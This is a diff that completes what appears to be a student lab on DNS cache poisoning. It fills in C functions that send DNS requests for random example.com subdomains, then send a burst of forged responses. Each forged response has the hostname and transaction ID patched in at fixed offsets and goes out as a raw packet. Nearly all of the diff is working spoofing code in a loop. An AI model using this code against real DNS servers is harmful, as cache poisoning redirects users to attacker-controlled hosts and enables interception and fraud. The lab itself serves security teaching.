@@ -7,6 +7,15 @@
 
 #define MAX_FILE_SIZE 1000000
 
+#define HOSTNAME_QUERY_LENGTH 0x5
+
+// For DNS request
+#define OFFSET_HOSTNAME_REQUEST 0x29
+
+//For DNS Response
+#define OFFSET_HOSTNAME_QUERY_RESPONSE 0x29
+#define OFFSET_HOSTNAME_ANSWER_RESPONSE 0x40
+#define OFFSET_TRANSACTION_ID_RESPONSE 0x1c
 
 /* IP Header */
 struct ipheader {
@@ -25,8 +34,8 @@ struct ipheader {
 };
 
 void send_raw_packet(char * buffer, int pkt_size);
-void send_dns_request( );
-void send_dns_response( );
+void send_dns_request(char* name, unsigned char* ip_req, int n_req);
+void send_dns_response(char* name, unsigned char* ip_resp, int n_resp, unsigned short id);
 
 int main()
 {
@@ -51,44 +60,69 @@ int main()
   int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
 
   char a[26]="abcdefghijklmnopqrstuvwxyz";
-  while (1) {
-    // Generate a random name with length 5
-    char name[5];
-    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];
-    memcpy(f_req  + 41, name , 5);
-    memcpy(f_resp + 64, name , 5);
-    //##################################################################
+  
+  // Times to loop
+  int times = 100;
+  int i = 0;
+  
+  while (i < times) {
+    unsigned short transaction_id = 1000;
+  
+    // Generate a random name with length HOSTNAME_QUERY_LENGTH = 5
+    char name[HOSTNAME_QUERY_LENGTH];
+    for (int k=0; k < HOSTNAME_QUERY_LENGTH; k++)  name[k] = a[rand() % 26];
+      
+    printf("Request #%d is [%s.example.com], transaction ID is: [%hu]\n", i++, name, transaction_id); 
+    
+    
     /* Step 1. Send a DNS request to the targeted local DNS server.
                This will trigger the DNS server to send out DNS queries */
-    send_dns_request();
-    // ... Students should add code here.
-
-
+    send_dns_request(name, ip_req, n_req);
+    
+    sleep(0.65);
+    
     /* Step 2. Send many spoofed responses to the targeted local DNS server,
                each one with a different transaction ID. */
-    
-    // ... Students should add code here.
-    
-    //##################################################################
+    for (transaction_id = 1000; transaction_id < 1101; transaction_id++){
+      send_dns_response(name, ip_resp, n_resp, transaction_id);}
+      
+    sleep(0.10);
   }
 }
 
 
-/* Use for sending DNS request.
- * Add arguments to the function definition if needed.
+/* Use for sending DNS request (Change hostname query)
+ * name	: Hostname query
+ * ip_req	: packet request template
+ * n_req	: length of DNS Request
  * */
-void send_dns_request()
+void send_dns_request(char* name, unsigned char* ip_req, int n_req)
 {
-  // Students need to implement this function
+  // Modify hostname in DNS Request (5 bytes - fixed length) in specified offset
+  memcpy(ip_req + OFFSET_HOSTNAME_REQUEST, name, HOSTNAME_QUERY_LENGTH);
+  
+  // Send DNS Request
+  send_raw_packet(ip_req, n_req);
 }
 
-
 /* Use for sending forged DNS response.
- * Add arguments to the function definition if needed.
+ * name	: Hostname in query and answer
+ * ip_resp	: packet response template
+ * n_resp	: length of DNS Response
+ * id		: transaction id of DNS Response  
  * */
-void send_dns_response()
+void send_dns_response(char* name, unsigned char* ip_resp, int n_resp, unsigned short id)
 {
-  // Students need to implement this function
+  // Modify hostname in Query and Anwser in DNS Request (5 bytes - fixed length) in specified offset
+  memcpy(ip_resp + OFFSET_HOSTNAME_QUERY_RESPONSE, name, HOSTNAME_QUERY_LENGTH);
+  memcpy(ip_resp + OFFSET_HOSTNAME_ANSWER_RESPONSE, name, HOSTNAME_QUERY_LENGTH);
+
+  // Modify the transaction ID field (offset = 0x1c)
+  unsigned short id_net_order = htons(id);
+  memcpy(ip_resp + OFFSET_TRANSACTION_ID_RESPONSE, &id_net_order, 2);
+
+  // Send DNS Response
+  send_raw_packet(ip_resp, n_resp);
 }
 
 
